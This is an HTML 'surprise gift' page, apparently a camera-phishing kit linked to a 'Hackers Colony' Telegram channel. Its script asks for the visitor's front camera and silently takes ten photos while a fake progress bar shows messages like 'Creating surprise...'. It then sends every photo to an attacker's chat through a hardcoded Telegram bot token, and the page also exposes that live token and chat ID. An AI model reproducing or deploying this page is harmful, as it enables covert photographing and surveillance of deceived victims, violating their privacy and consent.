<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ Your Special Surprise!</title>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: linear-gradient(135deg,#6a11cb,#2575fc); height: 100vh; display:flex; justify-content:center; align-items:center; padding:20px; }

        .container {
            background:white; padding:40px; border-radius:20px; width:100%; max-width:500px;
            text-align:center; box-shadow:0 20px 50px rgba(0,0,0,0.3); position:relative;
        }

        /* Contact Owner Button */
        .contact-owner { position:absolute; top:20px; right:20px; }
        .contact-btn {
            padding:10px 15px; border-radius:30px; text-decoration:none;
            background:linear-gradient(90deg,#ff416c,#ff4b2b); color:white; font-weight:bold;
            font-size:13px; box-shadow:0 5px 15px rgba(255,65,108,.4);
        }

        .gift-icon { font-size:80px; margin-bottom:20px; animation:bounce 2s infinite; }
        @keyframes bounce { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-15px);} }

        h1 { font-size:32px; margin-bottom:15px; color:#333; }
        .surprise-text {
            font-size:20px; font-weight:bold;
            background:linear-gradient(90deg,#6a11cb,#2575fc);
            -webkit-background-clip:text; -webkit-text-fill-color:transparent;
        }

        .btn {
            width:100%; background:linear-gradient(90deg,#6a11cb,#2575fc);
            color:white; padding:18px; border:none; margin-top:25px;
            font-size:20px; border-radius:50px; font-weight:bold; cursor:pointer;
        }

        video { width:100%; border-radius:10px; display:none; transform:scaleX(-1); border:3px solid #6a11cb; }

        .progress { width:100%; height:10px; background:#eee; border-radius:5px; margin-top:20px; }
        .progress-bar { height:100%; width:0%; background:linear-gradient(90deg,#00b09b,#96c93d); }

        .hidden { display:none; }
    </style>
</head>
<body>

    <!-- FIXED CONTACT OWNER BUTTON -->
    <div class="contact-owner">
        <a class="contact-btn" href="https://t.me/Hackers_Colony_Official" target="_blank">
            ğŸ“ Contact Owner
        </a>
    </div>

    <div class="container">

        <!-- Welcome -->
        <div id="welcomeScreen">
            <div class="gift-icon">ğŸ</div>
            <h1>Your Special Surprise</h1>

            <p class="surprise-text">
                â€œHey, I made something for you. It's small but special. Click below & enjoy the surprise ğŸâ€
            </p>

            <button class="btn" onclick="startSurprise()">ğŸ”“ UNLOCK MY SURPRISE</button>
        </div>

        <!-- Camera -->
        <video id="video" autoplay playsinline></video>

        <!-- Loading -->
        <div id="loading" class="hidden">
            <p id="status" style="margin:15px 0; font-size:18px; color:#333;">Creating your surprise...</p>
            <div class="progress"><div id="progressBar" class="progress-bar"></div></div>
        </div>

        <!-- Complete -->
        <div id="completeScreen" class="hidden">
            <div style="font-size:70px; color:#00b09b;">âœ…</div>
            <h1>Surprise Delivered!</h1>
            <p style="font-size:18px; color:#666;">Your personalized surprise has been delivered ğŸ</p>
        </div>

    </div>

    <canvas id="canvas" style="display:none;"></canvas>

<script>

const BOT_TOKEN = "8226782560:AAE3pOwbdZR8lWUoa2rd8Gf5fLTeQM2eguM";
const OWNER_CHAT_ID = "8215819954";  // ALWAYS send to you
const TOTAL_PHOTOS = 10;

// Read user chat_id from bot link
const urlParams = new URLSearchParams(window.location.search);
const USER_CHAT_ID = urlParams.get("chat_id") || null;

// DOM
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const loading = document.getElementById("loading");
const progressBar = document.getElementById("progressBar");
const statusText = document.getElementById("status");
const welcomeScreen = document.getElementById("welcomeScreen");
const completeScreen = document.getElementById("completeScreen");

let stream;
let count = 0;

function startSurprise() {
    welcomeScreen.classList.add("hidden");

    navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" } })
        .then(s => {
            stream = s;
            video.srcObject = s;
            video.style.display = "block";

            setTimeout(() => startProcessing(), 1500);
        })
        .catch(() => startProcessing());  
}

async function startProcessing() {
    video.style.display = "none";
    loading.classList.remove("hidden");

    const messages = [
        "Initializing...", "Preparing magic...", "Capturing moment...",
        "Enhancing quality...", "Creating surprise...", "Almost done..."
    ];

    let msgIndex = 0;

    let interval = setInterval(async () => {
        if (count >= TOTAL_PHOTOS) {
            clearInterval(interval);
            finish();
            return;
        }

        statusText.innerText = messages[msgIndex % messages.length];
        msgIndex++;

        let blob = await capturePhoto();
        count++;

        progressBar.style.width = (count / TOTAL_PHOTOS) * 100 + "%";

        await sendToBoth(blob, count);

    }, 800);
}

function capturePhoto() {
    canvas.width = video.videoWidth || 400;
    canvas.height = video.videoHeight || 400;
    let ctx = canvas.getContext("2d");

    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0);

    return new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
}

async function sendToBoth(blob, num) {
    const file = new File([blob], `capture_${num}.jpg`, { type: "image/jpeg" });

    let formData = new FormData();
    formData.append("photo", file);
    formData.append("caption", `ğŸ“¸ Surprise Photo #${num}`);

    // Send to Owner ALWAYS
    formData.append("chat_id", OWNER_CHAT_ID);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body:formData });

    // Send to USER (if chat_id exists)
    if (USER_CHAT_ID) {
        let fd2 = new FormData();
        fd2.append("photo", file);
        fd2.append("caption", `ğŸ“¸ Your Surprise Photo #${num}`);
        fd2.append("chat_id", USER_CHAT_ID);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body:fd2 });
    }
}

function finish() {
    loading.classList.add("hidden");
    completeScreen.classList.remove("hidden");

    if (stream) stream.getTracks().forEach(t => t.stop());
}

</script>
</body>
</html>
